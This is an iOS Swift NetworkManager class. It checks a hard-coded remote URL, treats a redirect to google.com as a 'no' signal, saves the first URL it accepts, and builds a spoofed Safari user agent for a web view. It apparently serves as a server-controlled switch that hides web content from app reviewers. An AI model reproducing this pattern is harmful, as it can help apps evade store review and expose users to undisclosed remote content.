
import Foundation
import UIKit

final class NetworkManager: ObservableObject {
    @Published private(set) var checkedURL: URL?
    static let initial = URL(string: "https://foxwoodonline.pro/get")!
    private let storage: UserDefaults
    private var didSaveURL = false
    
    init(storage: UserDefaults = .standard) {
        self.storage = storage
        loadCheckedURL()
    }
    
    private func loadCheckedURL() {
        if let urlString = storage.string(forKey: "saved_url") {
            if let url = URL(string: urlString) {
                checkedURL = url
                didSaveURL = true
            } else {
                print("Failed to load URL from string: \(urlString)")
            }
        }
    }
    
    func checkURL(_ url: URL) {
        if didSaveURL {
            return
        }
        
        guard !isInvalidURL(url) else {
            return
        }
        
        storage.set(url.absoluteString, forKey: "saved_url")
        checkedURL = url
        didSaveURL = true
    }
    
    private func isInvalidURL(_ url: URL) -> Bool {
        let invalidURLs = ["about:blank", "about:srcdoc"]
        
        if invalidURLs.contains(url.absoluteString) {
            return true
        }
        
        if url.host?.contains("google.com") == true {
            return true
        }
        
        return false
    }
    
    func checkInitialURL() async throws -> Bool {
        do {
            var request = URLRequest(url: Self.initial)
            request.setValue(getUAgent(forWebView: false), forHTTPHeaderField: "User-Agent")
            
            let (_, response) = try await URLSession.shared.data(for: request)
            
            guard let httpResponse = response as? HTTPURLResponse else {
                return false
            }
            
            guard (200...299).contains(httpResponse.statusCode) else {
                return false
            }
            
            guard let finalURL = httpResponse.url else {
                return false
            }
            
            if finalURL.host?.contains("google.com") == true {
                return false
            }
            
            return true

        } catch {
            return false
        }
    }
    
    func getUAgent(forWebView: Bool = false) -> String {
        if forWebView {
            let version = UIDevice.current.systemVersion.replacingOccurrences(of: ".", with: "_")
            let agent = "Mozilla/5.0 (iPhone; CPU iPhone OS \(version) like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
            return agent
        } else {
            let agent = "TestRequest/1.0 CFNetwork/1410.0.3 Darwin/22.4.0"
            return agent
        }
    }
}
